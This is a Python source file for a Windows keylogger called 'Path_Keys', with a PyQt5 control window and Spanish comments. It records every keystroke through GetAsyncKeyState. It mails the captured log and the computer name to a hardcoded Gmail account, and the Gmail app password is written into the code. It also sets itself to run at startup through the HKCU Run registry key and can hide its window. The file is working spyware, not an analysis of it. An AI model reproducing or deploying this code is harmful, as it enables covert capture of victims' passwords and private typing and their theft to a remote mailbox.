import ctypes
import threading
import smtplib
from email.mime.text import MIMEText
from PyQt5.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QPushButton, QTextEdit, QWidget, QMessageBox, QSystemTrayIcon, QMenu
from PyQt5.QtGui import QIcon
from PyQt5.QtCore import QTimer, Qt
import os
import sys
import winreg

# Definir constantes de la API de Windows
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

class Keylogger:
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True
        self.frequency = 30
        self.ctrl_pressed = False
        self.shift_pressed = False  # Estado para la tecla Shift
        self.alt_pressed = False    # Estado para la tecla Alt
        self.caps_lock_on = False  # Estado de Caps Lock

    def get_computer_name(self):
        """Obtiene el nombre de la computadora"""
        return os.environ.get('COMPUTERNAME', 'Desconocido')

    def set_frequency(self, frequency):
        """Actualiza la frecuencia del temporizador."""
        self.frequency = frequency
        if self.timer:
            self.timer.cancel()
            self.report()

    def pressed_key(self, key_code):
        """Procesa las teclas presionadas, registrando solo las teclas del alfabeto y caracteres especiales cuando Shift está presionado."""
        char = ""

        # Detectar teclas del teclado numérico
        if 96 <= key_code <= 105:  # Números del teclado numérico
            char = chr(key_code - 48)  # Ajuste para que los números se capturen correctamente
        elif key_code == 13:  # Enter
            char = "\n"
        elif key_code == 32:  # Espacio
            char = " "
        elif key_code == 16:  # Shift
            self.shift_pressed = True
            char = ""
            self.log += "SHIFT "
        elif key_code == 18:  # Alt
            self.alt_pressed = True
            char = ""
            self.log += "ALT "
        elif key_code == 20:  # Caps Lock
            self.caps_lock_on = not self.caps_lock_on
            char = ""
            self.log += "MAYUSCULAS --> " + ("ACTIVADAS" if self.caps_lock_on else "desactivadas")
        elif key_code == 9:  # Tab
            char = "\t"
        elif key_code == 27:  # Esc
            char = "Esc "
        elif key_code == 37:  # Left Arrow
            char = "← "
        elif key_code == 38:  # Up Arrow
            char = "↑ "
        elif key_code == 39:  # Right Arrow
            char = "→ "
        elif key_code == 40:  # Down Arrow
            char = "↓ "
        elif key_code == 112:  # F1
            char = "f1 "
        elif key_code == 113:  # F2
            char = "f2 "
        elif key_code == 114:  # F3
            char = "f3 "
        elif key_code == 115:  # F4
            char = "f4 "
        elif key_code == 116:  # F5
            char = "f5 "
        elif key_code == 117:  # F6
            char = "f6 "
        elif key_code == 118:  # F7
            char = "f7 "
        elif key_code == 119:  # F8
            char = "f8 "
        elif key_code == 120:  # F9
            char = "f9 "
        elif key_code == 121:  # F10
            char = "f10 "
        elif key_code == 122:  # F11
            char = "f11 "
        elif key_code == 123:  # F12
            char = "f12 "
        elif key_code == 192:  # Tecla de tilde ()
            char = ""
        elif key_code == 187:  # Tecla de más (+)
            char = "+ "
        elif key_code == 189:  # Tecla de menos (-)
            char = "- "
        elif key_code == 188:  # Coma
            char = ", "
        elif key_code == 190:  # Punto
            char = ". "
        elif key_code == 191:  # Barra diagonal (/)
            char = "/"
        elif key_code == 220:  # Barra invertida (\)
            char = "\\"
        elif key_code == 186:  # Punto y coma
            char = "; "
        elif key_code == 222:  # Comillas simples
            char = "' "
        elif key_code == 219:  # Corchete izquierdo
            char = "["
        elif key_code == 221:  # Corchete derecho
            char = "]"
        elif key_code == 226:  # Tilde (~)
            char = "~"
        elif key_code == 144:  # Tecla Insert
            char = "Insert "
        elif key_code == 46:  # Tecla Suprimir
            char = "Supr "
        elif key_code == 91 or key_code == 92:  # Teclas de Windows
            char = "Win "
        elif 65 <= key_code <= 90:  # Letras del alfabeto (A-Z)
            char = chr(key_code)  # Solo capturamos la letra, sin convertirla a mayúsculas/minúsculas
        elif 97 <= key_code <= 122:  # Letras del alfabeto (a-z)
            char = chr(key_code)  # Capturamos directamente la letra minúscula
        elif 48 <= key_code <= 57:  # Números del teclado alfabético (0-9)
            if self.shift_pressed:  # Si Shift está presionado, capturamos el carácter especial
                shift_specials = {
                    48: ")", 49: "!", 50: "@", 51: "#", 52: "$", 53: "%",
                    54: "^", 55: "&", 56: "*", 57: "(", 189: "_", 187: "+",
                    191: "/", 220: "\\", 186: ";", 222: "'", 189: "_", 
                    226: "~", 219: "[", 221: "]", 188: ",", 190: ".",
                    192: "", 188: ",", 220: "|", 223: "°", 222: '"', 
                    221: "]", 192: ""
                }
                char = shift_specials.get(key_code, "")
            else:
                char = chr(key_code)  # Captura el número normal
        elif key_code == 64:  # @
            char = "@"
        elif key_code == 17:  # Detectar Ctrl
            self.ctrl_pressed = True
        elif key_code == 67 and self.ctrl_pressed:  # Ctrl + C
            char = "Ctrl+C"
        elif key_code == 86 and self.ctrl_pressed:  # Ctrl + V
            char = "Ctrl+V"
        elif self.alt_pressed:
            alt_specials = {
                32: " ", 33: "!", 34: '"', 35: "#", 36: "$", 37: "%",
                38: "&", 39: "'", 40: "(", 41: ")", 42: "*", 43: "+",
                44: ",", 45: "-", 46: ".", 47: "/", 48: "0", 49: "1",
                50: "2", 51: "3", 52: "4", 53: "5", 54: "6", 55: "7",
                56: "8", 57: "9", 58: ":", 59: ";", 60: "<", 61: "=",
                62: ">", 63: "?", 64: "@"
            }
            char = alt_specials.get(key_code, "")

        # Si no es Ctrl o Shift o Alt, resetear el estado de Ctrl, Shift y Alt
        if key_code != 17:
            self.ctrl_pressed = False
        if key_code != 16:
            self.shift_pressed = False
        if key_code != 18:  # 18 es la tecla Alt
            self.alt_pressed = False

        self.log += char

    def get_logs(self):
        """Devuelve los logs actuales."""
        return self.log

    def clear_logs(self):
        """Limpia los logs.""" 
        self.log = ""

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

    def report(self):
        if len(self.log) > 2048:  # 3 KB
            computer_name = self.get_computer_name()  # Obtener el nombre de la PC
            email_body = f"[+] Keylogger Iniciado en {computer_name}" if self.is_first_run else f"{self.log}\n\nPC: {computer_name}"
            self.send_email(
                "Reporte Mail", email_body, "twopers02@gmail.com",
                ["twopers02@gmail.com"], "acic hdtk uqgx ctqi"
            )
            self.log = ""

        if self.is_first_run:
            self.is_first_run = False

        if not self.request_shutdown:
            self.timer = threading.Timer(self.frequency, self.report)
            self.timer.start()

    def key_logger_loop(self):
        while not self.request_shutdown:
            for key_code in range(1, 256):
                if user32.GetAsyncKeyState(key_code) & 0x0001:
                    self.pressed_key(key_code)

    def shutdown(self):
        self.request_shutdown = True
        if self.timer:
            self.timer.cancel()

    def start(self):
        threading.Thread(target=self.key_logger_loop, daemon=True).start()
        self.report()

    def add_to_startup(self):
        """Añadir el programa a las aplicaciones que se inician con Windows."""        
        try:
            # Obtén la ruta del ejecutable actual
            exe_path = sys.argv[0]
            
            # Accede a la clave del registro de inicio de Windows
            reg_key = winreg.HKEY_CURRENT_USER
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg_value_name = "Path_Keys_App"

            # Abre la clave del registro en modo de escritura
            with winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE) as reg_key:
                # Añade el ejecutable al registro
                winreg.SetValueEx(reg_key, reg_value_name, 0, winreg.REG_SZ, exe_path)
                
            QMessageBox.information(None, "Éxito", "El programa se ha añadido al inicio de Windows.")
        except Exception as e:
            QMessageBox.warning(None, "Error", f"No se pudo añadir el programa al inicio: {str(e)}")


class KeyloggerUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Path_Keys")
        self.setGeometry(100, 100, 400, 300)

        self.keylogger = Keylogger()
        self.frequency = 30

        self.central_widget = QWidget()
        self.layout = QVBoxLayout()

        self.start_button = QPushButton("Iniciar")
        self.start_button.clicked.connect(self.start_keylogger)

        self.stop_button = QPushButton("Detener")
        self.stop_button.clicked.connect(self.stop_keylogger)

        self.hide_button = QPushButton("Ocultar")
        self.hide_button.clicked.connect(self.hide_program)

        self.view_logs_button = QPushButton("Ver Logs")
        self.view_logs_button.clicked.connect(self.view_logs)

        self.export_logs_button = QPushButton("Exportar Logs a TXT")
        self.export_logs_button.clicked.connect(self.export_logs)

        # Aquí corregimos la conexión
        self.add_to_startup_button = QPushButton("Añadir al arranque")
        self.add_to_startup_button.clicked.connect(self.keylogger.add_to_startup)  # Corrección aquí

        self.text_area = QTextEdit()
        self.text_area.setReadOnly(True)

        # Añadir el nuevo botón a la interfaz
        self.layout.addWidget(self.start_button)
        self.layout.addWidget(self.stop_button)
        self.layout.addWidget(self.hide_button)
        self.layout.addWidget(self.view_logs_button)
        self.layout.addWidget(self.export_logs_button)
        self.layout.addWidget(self.add_to_startup_button)  # Nuevo botón
        self.layout.addWidget(self.text_area)

        self.central_widget.setLayout(self.layout)
        self.setCentralWidget(self.central_widget)

    def start_keylogger(self):
        self.keylogger.start()
        self.text_area.append("[+] Keylogger iniciado.")

    def stop_keylogger(self):
        self.keylogger.shutdown()
        self.text_area.append("[-] Keylogger detenido.")

    def hide_program(self):
        self.hide()
        self.keylogger.add_to_startup()

    def show_program(self):
        self.show()

    def view_logs(self):
        logs = self.keylogger.get_logs()
        self.text_area.setText(logs if logs else "No hay logs disponibles.")

    def export_logs(self):
        logs = self.keylogger.get_logs()
        if logs:
            file_path = os.path.join(os.getcwd(), "keys_path_logs.txt")
            with open(file_path, "w", encoding="utf-8") as file:
                file.write(logs)
            QMessageBox.information(self, "Exportar Logs", f"Logs exportados a: {file_path}")
        else:
            QMessageBox.information(self, "Exportar Logs", "No hay logs para exportar.")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = KeyloggerUI()
    window.show()
    sys.exit(app.exec_())
